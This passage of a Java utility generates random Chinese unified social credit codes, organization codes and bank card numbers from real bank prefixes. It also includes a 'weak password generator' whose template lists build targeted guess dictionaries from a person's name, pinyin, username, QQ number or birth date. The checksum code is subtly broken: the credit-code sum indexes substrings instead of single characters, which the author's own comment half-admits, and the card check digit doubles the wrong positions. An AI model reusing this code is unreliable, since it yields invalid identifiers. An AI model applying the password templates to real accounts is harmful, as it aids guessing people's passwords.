                "130406", "130421", "130423", "130424", "130425", "130426", "130427", "130428", "130429", "130430"};

        //登记管理部门代码 第1位
        int index;
        index = rd.nextInt(orgCode_list.length);
        String[] orgCode= orgCode_list[index].split("\\|");
        //jta.setText(jta.getText()+"\n"+orgCode);

        //机构类别代码 第2位
        String[] temp;
        temp = icCode_list[index].split("&");
        String[] icCode = temp[rd.nextInt(temp.length)].split("\\|");
        //jta.setText(jta.getText()+"\n"+icCode[0]);

        //登记管理机关行政区划码 第3—8位
        String areas = areas_list[rd.nextInt(areas_list.length)];
        //jta.setText(jta.getText()+"\n"+areas);

        //主体标识码(组织机构代码) 第9—17位
        String subject;
        String num ="";
        for(int i=0;i<8;i++){
            if(i==0){
                num += String.valueOf(rd.nextInt(8)+1);
            }else {
                num += String.valueOf(rd.nextInt(9));
            }
        }

        int[] ws = {3, 7, 9, 10, 5, 8, 4, 2};
        int sum = 0;
        for (int i=0;i<num.length();i++){
            sum += Integer.valueOf(num.substring(i,i+1)) * ws[i];
        }

        int C9 = 11 - (sum % 11);
        String temp_1="";
        if (C9 == 11) {
            temp_1 = "0";
        }else if(C9 == 10) {
            temp_1 = "X";
        }else {
            temp_1 = String.valueOf(C9);
        }
        subject = num + temp_1;
        //jta.setText(jta.getText()+"\n"+subject);

        //校验码 第18位
        String code = orgCode[0] + icCode[0] + areas + subject;//前面17位合并算最后一位校验码
        String s = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        int[] wi = {1, 3, 9, 27, 19, 26, 16, 17, 20, 29, 25, 13, 8, 24, 10, 30, 28};
        sum = 0;
        for(int i = 0;i < wi.length;i++) {
            sum += s.indexOf(code.substring(i)) * wi[i];
        }


        int C18 = 31 - (sum % 31);
        String temp_2;
        if (C18 == 31) {
            temp_2 = "0";
        }else if(C18 >35){//算法可能出现问题了
            //jta.setText(jta.getText()+"\n"+"---算法错误----");
            C18 = rd.nextInt(36);
            temp_2 = s.substring(C18,C18 + 1);
        }else{
            temp_2 = s.substring(C18,C18 + 1);
        }
        //完整的统一社会信用代码
        code += temp_2;
        jta.setText(jta.getText()+"\n"+code+"\n"+orgCode[1]+"->"+icCode[1]);
        return code;
    }

    //组织机构代码
    private String data4_end(){
        Random rd = new Random();
        String num ="";
        for(int i=0;i<8;i++){
            if(i==0){
                num += String.valueOf(rd.nextInt(8)+1);
            }else {
                num += String.valueOf(rd.nextInt(9));
            }
        }

        int[] ws = {3, 7, 9, 10, 5, 8, 4, 2};
        int sum = 0;

        for(int i = 0;i<ws.length;i++){
            sum += Integer.valueOf(num.substring(i,i+1)) * ws[i];
        }

        int C9 = 11 - (sum % 11);
        String temp="";
        if (C9 == 11){
            temp = "0";
        }else if(C9 == 10){
            temp = "X";
        } else {
            temp = String.valueOf(C9);
        }

        String code= num+"-" +temp;
        jta.setText(jta.getText()+"\n"+code);
        return code;



    }

    //银行卡
    private String data5_end(){
        Random rd = new Random();
        String code ="";

        String[] Bank_list = {"中国工商银行VISA学生国际信用卡|427020","中国工商银行VISA国际信用卡金卡|427030","中国工商银行MC国际信用卡普通卡|530990","中国工商银行新版人民币贷记卡普卡|622230","中国工商银行新版人民币贷记卡金卡|622235","中国工商银行新版信用卡(准贷)普卡|622210","中国工商银行新版信用卡(准贷)金卡|622215","中国工商银行牡丹灵通卡借记卡|622200","中国工商银行原牡丹灵通卡借记卡|955880","中国农业银行人民币贷记卡 香港旅游卡贷记卡金卡|622836","中国农业银行人民币贷记卡 香港旅游卡贷记卡普卡|622837","中国农业银行世纪通宝借记卡|622848","农业银行|552599","农业银行|404119","农业银行|404121","农业银行|519412","农业银行|403361","农业银行|558730","农业银行|520083","农业银行|520082","农业银行|519413","农业银行|49102","农业银行|404120","农业银行|404118","农业银行|53591","农业银行|404117","中国银行中银都市卡|622760","中国银行BOC系列VISA标准卡普通卡/VISA高校认同卡|409666","中国银行国航知音信用卡|438088","中国银行上海市分行长城人民币贷记卡普通卡|622752","中国建设银行VISA龙卡借记卡|436742","中国建设银行VISA龙卡贷记卡|436745","中国建设银行支付宝龙卡借记卡|622280","交通银行VISA普通卡|458123","交通银行MC信用卡普通卡|521899","交通银行太平洋卡借记卡|622260","中信银行国航知音信用卡/万事达卡普通卡|518212","中信银行理财宝卡借记卡|622690","中信银行万事达卡金卡|520108","中信银行蓝卡/I卡信用卡|622680","中信银行|376968","中信银行|376966","中信银行|622918","中信银行|622916","中信银行|376969","中信银行|622919","光大银行|406254","光大银行|622655","光大银行|622650","光大银行|622658","光大银行|356839","光大银行|486497","华夏银行|539867","华夏银行MC钛金卡|523959","华夏银行人民币卡金卡|622637","华夏银行人民币卡普卡|622636","华夏银行MC金卡|528708","华夏银行MC普卡|539868","民生银行|407405","中国民生银行MC金卡|512466","中国民生银行星座卡借记卡|415599","中国民生银行VISA信用卡金卡|421870","中国民生银行蝶卡银卡借记卡|622622","民生银行|528948","民生银行|552288","民生银行|556610","民生银行|622600","民生银行|622601","民生银行|622602","民生银行|622603","民生银行|421869","广东发展银行新理财通借记卡|622568","广东发展银行南航明珠卡MC金卡|520152","广东发展银行南航明珠卡MC普卡|520382","广东发展银行理财通借记卡|911121","广发真情卡|548844","深圳平安银行|622155","深圳平安银行万事达卡普卡|528020","深圳平安银行万事达卡金卡|526855","深发展联名普卡|435744","深发展卡普通卡|622526","深发展联名金卡|435745","深圳发展银行|998801","深发展卡金卡|622525","深圳发展银行发展卡借记卡|622538","招商银行哆啦A梦粉丝信用卡|518710","招商银行QQ一卡通借记卡|622588","招商银行HELLO KITTY单币卡|622575","招商银行|545947","招商银行|521302","招商银行|439229","招商银行|552534","招商银行|622577","招商银行|622579","招商银行|439227","招商银行|479229","招商银行|356890","招商银行|356885","招商银行|545948","招商银行|545623","招商银行JCB信用卡普通卡|356889","招商银行VISA白金卡|439188","招商银行VISA信用卡普通卡|439225","招商银行VISA信用卡金卡|439226","兴业银行|451289","兴业银行|622902","兴业银行|622901","兴业银行|527414","兴业银行|524070","兴业银行|486493","兴业银行|486494","兴业银行|451290","兴业银行|523036","兴业银行|486861","上海浦东发展银行奥运WOW卡美元单币|418152","上海浦东发展银行WOW卡/奥运WOW卡|456418","上海浦东发展银行东方卡借记卡|622521","上海浦东发展银行VISA普通卡|404738","上海浦东发展银行VISA金卡|404739","浦东发展银行|498451","浦东发展银行|622517","浦东发展银行|622518","浦东发展银行|515672","浦东发展银行|517650","浦东发展银行|525998","浦东发展银行|356850","浦东发展银行|356851","浦东发展银行|356852","中国邮政储蓄绿卡借记卡|622188"};
        String[] code_1 = Bank_list[rd.nextInt(Bank_list.length)].split("\\|");

        String code_2 = code_1[1];
        for(int i=0;i<9;i++){
            code_2+=rd.nextInt(10);
        }

        //按照从右往左的顺序，从这串数字的右边开始，包含校验码，将偶数位数字乘以2，如果每次乘二操作的结果大于9（如 8 × 2 = 16），然后计算个位和十位数字的和（如 1 ＋ 6 = 7）或者用这个结果减去9（如 16 - 9 ＝ 7）；
        int temp_2 = 0;
        for(int i=1;i<15;i+=2){
            int temp = Integer.valueOf(code_2.substring(i,i+1))*2;
            //jta.setText(jta.getText()+"\n-->"+temp);
            if(temp > 9){
                temp_2 += temp-9;
            }else {
                temp_2 += temp;
            }
        }

        for(int i=0;i<15;i+=2){
            temp_2 += Integer.valueOf(code_2.substring(i,i+1));
        }

        //算校验码
        for(int i=0;i<10;i++){
            if((temp_2+i)%10==0){
                code += code_2 + i;
            }
        }

        jta.setText(jta.getText()+"\n"+code_1[0]+":\n"+code);

        return code;



    }

    //弱口令生成器
    private String data6_end(String rkl_tf_0,String rkl_tf_1,String rkl_tf_2,String rkl_tf_3,String rkl_tf_4,String rkl_tf_5,String rkl_tf_6,String rkl_tf_7,String rkl_tf_8,String rkl_tf_9){
        String data = "";
        List<String> data_list = new ArrayList<String>();

        //名字简称
        String[] name_jc = {"#名字简称#","#名字简称#.","woaini#名字简称#","woaini#名字简称#.","520#名字简称#","520#名字简称#.","#名字简称#lovewifejp","#名字简称#lovewifejp.","#名字简称#LOVEWIFEJP","#名字简称#LOVEWIFEJP.","#名字简称#123123","#名字简称#123123.","#名字简称#123123123","#名字简称#123123123.","#名字简称#112233","#名字简称#112233.","#名字简称#445566","#名字简称#445566.","#名字简称#456456","#名字简称#456456.","#名字简称#778899","#名字简称#778899.","#名字简称#789789","#名字简称#789789.","#名字简称#321321","#名字简称#321321.","#名字简称#520","#名字简称#520.","#名字简称#1314","#名字简称#1314.","#名字简称#5201314","#名字简称#5201314.","#名字简称#1314520","#名字简称#1314520.","#名字简称#147369","#名字简称#147369.","#名字简称#258","#名字简称#258.","#名字简称#147","#名字简称#147.","#名字简称#456","#名字简称#456.","#名字简称#789","#名字简称#789.","#名字简称#147258369","#名字简称#147258369.","#名字简称#111222","#名字简称#111222.","#名字简称#1","#名字简称#1.","#名字简称#12","#名字简称#12.","#名字简称#123","#名字简称#123.","#名字简称#1234","#名字简称#1234.","#名字简称#123456","#名字简称#123456.","#名字简称#1234567","#名字简称#1234567.","#名字简称#12345678","#名字简称#12345678.","#名字简称#123456789","#名字简称#123456789.","#名字简称#987654321","#名字简称#978654321.","#名字简称#978654321","#名字简称#87654321","#名字简称#78654321.","#名字简称#78654321","#名字简称#7654321","#名字简称#8654321.","#名字简称#8654321","#名字简称#654321","#名字简称#654321.","#名字简称#54321","#名字简称#54321.","#名字简称#4321","#名字简称#4321.","#名字简称#321","#名字简称#321.","#名字简称#21","#名字简称#21.","#名字简称#11","#名字简称#11.","#名字简称#111","#名字简称#111.","#名字简称#1111","#名字简称#1111.","#名字简称#11111","#名字简称#11111.","#名字简称#111111","#名字简称#111111.","#名字简称#1111111","#名字简称#1111111.","#名字简称#11111111","#名字简称#11111111.","#名字简称#2","#名字简称#2.","#名字简称#22","#名字简称#22.","#名字简称#222","#名字简称#222.","#名字简称#2222","#名字简称#2222.","#名字简称#22222","#名字简称#22222.","#名字简称#222222","#名字简称#222222.","#名字简称#2222222","#名字简称#2222222.","#名字简称#22222222","#名字简称#22222222.","#名字简称#33","#名字简称#33.","#名字简称#333","#名字简称#333.","#名字简称#3333","#名字简称#3333.","#名字简称#33333","#名字简称#33333.","#名字简称#333333","#名字简称#333333.","#名字简称#3333333","#名字简称#3333333.","#名字简称#33333333","#名字简称#33333333.","#名字简称#44","#名字简称#44.","#名字简称#444","#名字简称#444.","#名字简称#4444","#名字简称#4444.","#名字简称#44444","#名字简称#44444.","#名字简称#444444","#名字简称#444444.","#名字简称#4444444","#名字简称#4444444.","#名字简称#44444444","#名字简称#44444444.","#名字简称#55","#名字简称#55.","#名字简称#555","#名字简称#555.","#名字简称#5555","#名字简称#5555.","#名字简称#55555","#名字简称#55555.","#名字简称#555555","#名字简称#555555.","#名字简称#5555555","#名字简称#5555555.","#名字简称#55555555","#名字简称#55555555.","#名字简称#66","#名字简称#66.","#名字简称#666","#名字简称#666.","#名字简称#6666","#名字简称#6666.","#名字简称#66666","#名字简称#66666.","#名字简称#666666","#名字简称#666666.","#名字简称#6666666","#名字简称#6666666.","#名字简称#66666666","#名字简称#66666666.","#名字简称#77","#名字简称#77.","#名字简称#777","#名字简称#777.","#名字简称#7777","#名字简称#7777.","#名字简称#77777","#名字简称#77777.","#名字简称#777777","#名字简称#777777.","#名字简称#7777777","#名字简称#7777777.","#名字简称#77777777","#名字简称#77777777.","#名字简称#88","#名字简称#88.","#名字简称#888","#名字简称#888.","#名字简称#8888","#名字简称#8888.","#名字简称#88888","#名字简称#88888.","#名字简称#888888","#名字简称#888888.","#名字简称#8888888","#名字简称#8888888.","#名字简称#88888888","#名字简称#88888888.","#名字简称#99","#名字简称#99.","#名字简称#999","#名字简称#999.","#名字简称#9999","#名字简称#9999.","#名字简称#99999","#名字简称#99999.","#名字简称#999999","#名字简称#999999.","#名字简称#9999999","#名字简称#9999999.","#名字简称#99999999","#名字简称#99999999.","#名字简称#00","#名字简称#00.","#名字简称#000","#名字简称#000.","#名字简称#0000","#名字简称#0000.","#名字简称#00000","#名字简称#00000.","#名字简称#000000","#名字简称#000000.","#名字简称#0000000","#名字简称#0000000.","#名字简称#00000000","#名字简称#00000000.","#名字简称#1997","#名字简称#1997.","#名字简称#1998","#名字简称#1998.","#名字简称#1999","#名字简称#1999.","#名字简称#2000","#名字简称#2000.","#名字简称#2001","#名字简称#2001.","#名字简称#2002","#名字简称#2002.","#名字简称#2003","#名字简称#2003.","#名字简称#2004","#名字简称#2004.","#名字简称#2005","#名字简称#2005.","#名字简称#2006","#名字简称#2006.","#名字简称#2007","#名字简称#2007.","#名字简称#2008","#名字简称#2008.","#名字简称#2009","#名字简称#2009.","#名字简称#2010","#名字简称#2010.","#名字简称#2011","#名字简称#2011.","#名字简称#2012","#名字简称#2012.","#名字简称#2013","#名字简称#2013.","#名字简称#2014","#名字简称#2014.","#名字简称#2015","#名字简称#2015.","#名字简称#2016","#名字简称#2016.","#名字简称#2017","#名字简称#2017.","#名字简称#2018","#名字简称#2018.","#名字简称#2019","#名字简称#2019.","#名字简称#2020","#名字简称#2020.","#名字简称#2021","#名字简称#2021.","#名字简称#2022","#名字简称#2022.","#名字简称#2023","#名字简称#2023."};
        //名字全称
        String[] name_qc = {"#名字全拼#","#名字全拼#.","#名字全拼#lovewifejp","#名字全拼#lovewifejp.","#名字全拼#LOVEWIFEJP","#名字全拼#LOVEWIFEJP.","#名字全拼#123123","#名字全拼#123123.","#名字全拼#123123123","#名字全拼#123123123.","#名字全拼#112233","#名字全拼#112233.","#名字全拼#445566","#名字全拼#445566.","#名字全拼#456456","#名字全拼#456456.","#名字全拼#778899","#名字全拼#778899.","#名字全拼#789789","#名字全拼#789789.","#名字全拼#321321","#名字全拼#321321.","#名字全拼#520","#名字全拼#520.","#名字全拼#1314","#名字全拼#1314.","#名字全拼#5201314","#名字全拼#5201314.","#名字全拼#1314520","#名字全拼#1314520.","#名字全拼#147369","#名字全拼#147369.","#名字全拼#258","#名字全拼#258.","#名字全拼#147","#名字全拼#147.","#名字全拼#456","#名字全拼#456.","#名字全拼#789","#名字全拼#789.","#名字全拼#147258369","#名字全拼#147258369.","#名字全拼#111222","#名字全拼#111222.","#名字全拼#1","#名字全拼#1.","#名字全拼#12","#名字全拼#12.","#名字全拼#123","#名字全拼#123.","#名字全拼#1234","#名字全拼#1234.","#名字全拼#123456","#名字全拼#123456.","#名字全拼#1234567","#名字全拼#1234567.","#名字全拼#12345678","#名字全拼#12345678.","#名字全拼#123456789","#名字全拼#123456789.","#名字全拼#987654321","#名字全拼#978654321.","#名字全拼#978654321","#名字全拼#87654321","#名字全拼#78654321.","#名字全拼#78654321","#名字全拼#7654321","#名字全拼#8654321.","#名字全拼#8654321","#名字全拼#654321","#名字全拼#654321.","#名字全拼#54321","#名字全拼#54321.","#名字全拼#4321","#名字全拼#4321.","#名字全拼#321","#名字全拼#321.","#名字全拼#21","#名字全拼#21.","#名字全拼#11","#名字全拼#11.","#名字全拼#111","#名字全拼#111.","#名字全拼#1111","#名字全拼#1111.","#名字全拼#11111","#名字全拼#11111.","#名字全拼#111111","#名字全拼#111111.","#名字全拼#1111111","#名字全拼#1111111.","#名字全拼#11111111","#名字全拼#11111111.","#名字全拼#2","#名字全拼#2.","#名字全拼#22","#名字全拼#22.","#名字全拼#222","#名字全拼#222.","#名字全拼#2222","#名字全拼#2222.","#名字全拼#22222","#名字全拼#22222.","#名字全拼#222222","#名字全拼#222222.","#名字全拼#2222222","#名字全拼#2222222.","#名字全拼#22222222","#名字全拼#22222222.","#名字全拼#33","#名字全拼#33.","#名字全拼#333","#名字全拼#333.","#名字全拼#3333","#名字全拼#3333.","#名字全拼#33333","#名字全拼#33333.","#名字全拼#333333","#名字全拼#333333.","#名字全拼#3333333","#名字全拼#3333333.","#名字全拼#33333333","#名字全拼#33333333.","#名字全拼#44","#名字全拼#44.","#名字全拼#444","#名字全拼#444.","#名字全拼#4444","#名字全拼#4444.","#名字全拼#44444","#名字全拼#44444.","#名字全拼#444444","#名字全拼#444444.","#名字全拼#4444444","#名字全拼#4444444.","#名字全拼#44444444","#名字全拼#44444444.","#名字全拼#55","#名字全拼#55.","#名字全拼#555","#名字全拼#555.","#名字全拼#5555","#名字全拼#5555.","#名字全拼#55555","#名字全拼#55555.","#名字全拼#555555","#名字全拼#555555.","#名字全拼#5555555","#名字全拼#5555555.","#名字全拼#55555555","#名字全拼#55555555.","#名字全拼#66","#名字全拼#66.","#名字全拼#666","#名字全拼#666.","#名字全拼#6666","#名字全拼#6666.","#名字全拼#66666","#名字全拼#66666.","#名字全拼#666666","#名字全拼#666666.","#名字全拼#6666666","#名字全拼#6666666.","#名字全拼#66666666","#名字全拼#66666666.","#名字全拼#77","#名字全拼#77.","#名字全拼#777","#名字全拼#777.","#名字全拼#7777","#名字全拼#7777.","#名字全拼#77777","#名字全拼#77777.","#名字全拼#777777","#名字全拼#777777.","#名字全拼#7777777","#名字全拼#7777777.","#名字全拼#77777777","#名字全拼#77777777.","#名字全拼#88","#名字全拼#88.","#名字全拼#888","#名字全拼#888.","#名字全拼#8888","#名字全拼#8888.","#名字全拼#88888","#名字全拼#88888.","#名字全拼#888888","#名字全拼#888888.","#名字全拼#8888888","#名字全拼#8888888.","#名字全拼#88888888","#名字全拼#88888888.","#名字全拼#99","#名字全拼#99.","#名字全拼#999","#名字全拼#999.","#名字全拼#9999","#名字全拼#9999.","#名字全拼#99999","#名字全拼#99999.","#名字全拼#999999","#名字全拼#999999.","#名字全拼#9999999","#名字全拼#9999999.","#名字全拼#99999999","#名字全拼#99999999.","#名字全拼#00","#名字全拼#00.","#名字全拼#000","#名字全拼#000.","#名字全拼#0000","#名字全拼#0000.","#名字全拼#00000","#名字全拼#00000.","#名字全拼#000000","#名字全拼#000000.","#名字全拼#0000000","#名字全拼#0000000.","#名字全拼#00000000","#名字全拼#00000000.","#名字全拼#1997","#名字全拼#1997.","#名字全拼#1998","#名字全拼#1998.","#名字全拼#1999","#名字全拼#1999.","#名字全拼#2000","#名字全拼#2000.","#名字全拼#2001","#名字全拼#2001.","#名字全拼#2002","#名字全拼#2002.","#名字全拼#2003","#名字全拼#2003.","#名字全拼#2004","#名字全拼#2004.","#名字全拼#2005","#名字全拼#2005.","#名字全拼#2006","#名字全拼#2006.","#名字全拼#2007","#名字全拼#2007.","#名字全拼#2008","#名字全拼#2008.","#名字全拼#2009","#名字全拼#2009.","#名字全拼#2010","#名字全拼#2010.","#名字全拼#2011","#名字全拼#2011.","#名字全拼#2012","#名字全拼#2012.","#名字全拼#2013","#名字全拼#2013.","#名字全拼#2014","#名字全拼#2014.","#名字全拼#2015","#名字全拼#2015.","#名字全拼#2016","#名字全拼#2016.","#名字全拼#2017","#名字全拼#2017.","#名字全拼#2018","#名字全拼#2018.","#名字全拼#2019","#名字全拼#2019.","#名字全拼#2020","#名字全拼#2020.","#名字全拼#2021","#名字全拼#2021.","#名字全拼#2022","#名字全拼#2022.","#名字全拼#2023","#名字全拼#2023."};
        //英文名
        String[] name_yw = {"woaini#英文名#","woaini#英文名#.","WOAINI#英文名#","WOAINI#英文名#.","520#英文名#","520#英文名#.","#英文名#lovewifejp","#英文名#lovewifejp.","#英文名#LOVEWIFEJP","#英文名#LOVEWIFEJP.","#英文名#123123","#英文名#123123.","#英文名#123123123","#英文名#123123123.","#英文名#112233","#英文名#112233.","#英文名#445566","#英文名#445566.","#英文名#456456","#英文名#456456.","#英文名#778899","#英文名#778899.","#英文名#789789","#英文名#789789.","#英文名#321321","#英文名#321321.","#英文名#520","#英文名#520.","#英文名#1314","#英文名#1314.","#英文名#5201314","#英文名#5201314.","#英文名#1314520","#英文名#1314520.","#英文名#147369","#英文名#147369.","#英文名#258","#英文名#258.","#英文名#147","#英文名#147.","#英文名#456","#英文名#456.","#英文名#789","#英文名#789.","#英文名#147258369","#英文名#147258369.","#英文名#111222","#英文名#111222.","#英文名#1","#英文名#1.","#英文名#12","#英文名#12.","#英文名#123","#英文名#123.","#英文名#1234","#英文名#1234.","#英文名#123456","#英文名#123456.","#英文名#1234567","#英文名#1234567.","#英文名#12345678","#英文名#12345678.","#英文名#123456789","#英文名#123456789.","#英文名#987654321","#英文名#978654321.","#英文名#978654321","#英文名#87654321","#英文名#78654321.","#英文名#78654321","#英文名#7654321","#英文名#8654321.","#英文名#8654321","#英文名#654321","#英文名#654321.","#英文名#54321","#英文名#54321.","#英文名#4321","#英文名#4321.","#英文名#321","#英文名#321.","#英文名#21","#英文名#21.","#英文名#11","#英文名#11.","#英文名#111","#英文名#111.","#英文名#1111","#英文名#1111.","#英文名#11111","#英文名#11111.","#英文名#111111","#英文名#111111.","#英文名#1111111","#英文名#1111111.","#英文名#11111111","#英文名#11111111.","#英文名#2","#英文名#2.","#英文名#22","#英文名#22.","#英文名#222","#英文名#222.","#英文名#2222","#英文名#2222.","#英文名#22222","#英文名#22222.","#英文名#222222","#英文名#222222.","#英文名#2222222","#英文名#2222222.","#英文名#22222222","#英文名#22222222.","#英文名#33","#英文名#33.","#英文名#333","#英文名#333.","#英文名#3333","#英文名#3333.","#英文名#33333","#英文名#33333.","#英文名#333333","#英文名#333333.","#英文名#3333333","#英文名#3333333.","#英文名#33333333","#英文名#33333333.","#英文名#44","#英文名#44.","#英文名#444","#英文名#444.","#英文名#4444","#英文名#4444.","#英文名#44444","#英文名#44444.","#英文名#444444","#英文名#444444.","#英文名#4444444","#英文名#4444444.","#英文名#44444444","#英文名#44444444.","#英文名#55","#英文名#55.","#英文名#555","#英文名#555.","#英文名#5555","#英文名#5555.","#英文名#55555","#英文名#55555.","#英文名#555555","#英文名#555555.","#英文名#5555555","#英文名#5555555.","#英文名#55555555","#英文名#55555555.","#英文名#66","#英文名#66.","#英文名#666","#英文名#666.","#英文名#6666","#英文名#6666.","#英文名#66666","#英文名#66666.","#英文名#666666","#英文名#666666.","#英文名#6666666","#英文名#6666666.","#英文名#66666666","#英文名#66666666.","#英文名#77","#英文名#77.","#英文名#777","#英文名#777.","#英文名#7777","#英文名#7777.","#英文名#77777","#英文名#77777.","#英文名#777777","#英文名#777777.","#英文名#7777777","#英文名#7777777.","#英文名#77777777","#英文名#77777777.","#英文名#88","#英文名#88.","#英文名#888","#英文名#888.","#英文名#8888","#英文名#8888.","#英文名#88888","#英文名#88888.","#英文名#888888","#英文名#888888.","#英文名#8888888","#英文名#8888888.","#英文名#88888888","#英文名#88888888.","#英文名#99","#英文名#99.","#英文名#999","#英文名#999.","#英文名#9999","#英文名#9999.","#英文名#99999","#英文名#99999.","#英文名#999999","#英文名#999999.","#英文名#9999999","#英文名#9999999.","#英文名#99999999","#英文名#99999999.","#英文名#00","#英文名#00.","#英文名#000","#英文名#000.","#英文名#0000","#英文名#0000.","#英文名#00000","#英文名#00000.","#英文名#000000","#英文名#000000.","#英文名#0000000","#英文名#0000000.","#英文名#00000000","#英文名#00000000.","#英文名#1997","#英文名#1997.","#英文名#1998","#英文名#1998.","#英文名#1999","#英文名#1999.","#英文名#2000","#英文名#2000.","#英文名#2001","#英文名#2001.","#英文名#2002","#英文名#2002.","#英文名#2003","#英文名#2003.","#英文名#2004","#英文名#2004.","#英文名#2005","#英文名#2005.","#英文名#2006","#英文名#2006.","#英文名#2007","#英文名#2007.","#英文名#2008","#英文名#2008.","#英文名#2009","#英文名#2009.","#英文名#2010","#英文名#2010.","#英文名#2011","#英文名#2011.","#英文名#2012","#英文名#2012.","#英文名#2013","#英文名#2013.","#英文名#2014","#英文名#2014.","#英文名#2015","#英文名#2015.","#英文名#2016","#英文名#2016.","#英文名#2017","#英文名#2017.","#英文名#2018","#英文名#2018.","#英文名#2019","#英文名#2019.","#英文名#2020","#英文名#2020.","#英文名#2021","#英文名#2021.","#英文名#2022","#英文名#2022.","#英文名#2023","#英文名#2023."};
        //用户名
        String[] name_yhm = {"#用户名#","#用户名#.","520#用户名#","520#用户名#.","#用户名#123123","#用户名#123123.","#用户名#123123123","#用户名#123123123.","#用户名#112233","#用户名#112233.","#用户名#445566","#用户名#445566.","#用户名#456456","#用户名#456456.","#用户名#778899","#用户名#778899.","#用户名#789789","#用户名#789789.","#用户名#321321","#用户名#321321.","#用户名#520","#用户名#520.","#用户名#1314","#用户名#1314.","#用户名#5201314","#用户名#5201314.","#用户名#1314520","#用户名#1314520.","#用户名#147369","#用户名#147369.","#用户名#258","#用户名#258.","#用户名#147","#用户名#147.","#用户名#456","#用户名#456.","#用户名#789","#用户名#789.","#用户名#147258369","#用户名#147258369.","#用户名#111222","#用户名#111222.","#用户名#1","#用户名#1.","#用户名#12","#用户名#12.","#用户名#123","#用户名#123.","#用户名#1234","#用户名#1234.","#用户名#123456","#用户名#123456.","#用户名#1234567","#用户名#1234567.","#用户名#12345678","#用户名#12345678.","#用户名#123456789","#用户名#123456789.","#用户名#987654321","#用户名#978654321.","#用户名#978654321","#用户名#87654321","#用户名#78654321.","#用户名#78654321","#用户名#7654321","#用户名#8654321.","#用户名#8654321","#用户名#654321","#用户名#654321.","#用户名#54321","#用户名#54321.","#用户名#4321","#用户名#4321.","#用户名#321","#用户名#321.","#用户名#21","#用户名#21.","#用户名#11","#用户名#11.","#用户名#111","#用户名#111.","#用户名#1111","#用户名#1111.","#用户名#11111","#用户名#11111.","#用户名#111111","#用户名#111111.","#用户名#1111111","#用户名#1111111.","#用户名#11111111","#用户名#11111111.","#用户名#2","#用户名#2.","#用户名#22","#用户名#22.","#用户名#222","#用户名#222.","#用户名#2222","#用户名#2222.","#用户名#22222","#用户名#22222.","#用户名#222222","#用户名#222222.","#用户名#2222222","#用户名#2222222.","#用户名#22222222","#用户名#22222222.","#用户名#33","#用户名#33.","#用户名#333","#用户名#333.","#用户名#3333","#用户名#3333.","#用户名#33333","#用户名#33333.","#用户名#333333","#用户名#333333.","#用户名#3333333","#用户名#3333333.","#用户名#33333333","#用户名#33333333.","#用户名#44","#用户名#44.","#用户名#444","#用户名#444.","#用户名#4444","#用户名#4444.","#用户名#44444","#用户名#44444.","#用户名#444444","#用户名#444444.","#用户名#4444444","#用户名#4444444.","#用户名#44444444","#用户名#44444444.","#用户名#55","#用户名#55.","#用户名#555","#用户名#555.","#用户名#5555","#用户名#5555.","#用户名#55555","#用户名#55555.","#用户名#555555","#用户名#555555.","#用户名#5555555","#用户名#5555555.","#用户名#55555555","#用户名#55555555.","#用户名#66","#用户名#66.","#用户名#666","#用户名#666.","#用户名#6666","#用户名#6666.","#用户名#66666","#用户名#66666.","#用户名#666666","#用户名#666666.","#用户名#6666666","#用户名#6666666.","#用户名#66666666","#用户名#66666666.","#用户名#77","#用户名#77.","#用户名#777","#用户名#777.","#用户名#7777","#用户名#7777.","#用户名#77777","#用户名#77777.","#用户名#777777","#用户名#777777.","#用户名#7777777","#用户名#7777777.","#用户名#77777777","#用户名#77777777.","#用户名#88","#用户名#88.","#用户名#888","#用户名#888.","#用户名#8888","#用户名#8888.","#用户名#88888","#用户名#88888.","#用户名#888888","#用户名#888888.","#用户名#8888888","#用户名#8888888.","#用户名#88888888","#用户名#88888888.","#用户名#99","#用户名#99.","#用户名#999","#用户名#999.","#用户名#9999","#用户名#9999.","#用户名#99999","#用户名#99999.","#用户名#999999","#用户名#999999.","#用户名#9999999","#用户名#9999999.","#用户名#99999999","#用户名#99999999.","#用户名#00","#用户名#00.","#用户名#000","#用户名#000.","#用户名#0000","#用户名#0000.","#用户名#00000","#用户名#00000.","#用户名#000000","#用户名#000000.","#用户名#0000000","#用户名#0000000.","#用户名#00000000","#用户名#00000000.","#用户名#1997","#用户名#1997.","#用户名#1998","#用户名#1998.","#用户名#1999","#用户名#1999.","#用户名#2000","#用户名#2000.","#用户名#2001","#用户名#2001.","#用户名#2002","#用户名#2002.","#用户名#2003","#用户名#2003.","#用户名#2004","#用户名#2004.","#用户名#2005","#用户名#2005.","#用户名#2006","#用户名#2006.","#用户名#2007","#用户名#2007.","#用户名#2008","#用户名#2008.","#用户名#2009","#用户名#2009.","#用户名#2010","#用户名#2010.","#用户名#2011","#用户名#2011.","#用户名#2012","#用户名#2012.","#用户名#2013","#用户名#2013.","#用户名#2014","#用户名#2014.","#用户名#2015","#用户名#2015.","#用户名#2016","#用户名#2016.","#用户名#2017","#用户名#2017.","#用户名#2018","#用户名#2018.","#用户名#2019","#用户名#2019.","#用户名#2020","#用户名#2020.","#用户名#2021","#用户名#2022.","#用户名#2022","#用户名#2023","#用户名#2023."};
        //qq号
        String[] name_qq = {"a#QQ号#","a#QQ号#.","A#QQ号#","A#QQ号#.","qq#QQ号#","qq#QQ号#.","QQ#QQ号#","QQ#QQ号#.","yy#QQ号#","yy#QQ号#.","YY#QQ号#","YY#QQ号#.","aa#QQ号#","aa#QQ号#.","AA#QQ号#","abc#QQ号#.","abc#QQ号#","abc#QQ号#.","ABC#QQ号#","ABC#QQ号#.","qwer#QQ号#","qwer#QQ号#.","QWER#QQ号#","QWER#QQ号#.","woaini#QQ号#","woaini#QQ号#.","WOAINI#QQ号#","WOAINI#QQ号#."};
        //出生日期
        String[] name_rq = {"a#出生日期#","a#出生日期#.","A#出生日期#","A#出生日期#.","qq#出生日期#","qq#出生日期#.","QQ#出生日期#","QQ#出生日期#.","yy#出生日期#","yy#出生日期#.","YY#出生日期#","YY#出生日期#.","aa#出生日期#","aa#出生日期#.","AA#出生日期#","abc#出生日期#.","abc#出生日期#","ABC#出生日期#","ABC#出生日期#.","qwer#出生日期#","qwer#出生日期#.","QWER#出生日期#","QWER#出生日期#.","woaini#出生日期#","woaini#出生日期#.","WOAINI#出生日期#","WOAINI#出生日期#."};
        //特殊数字
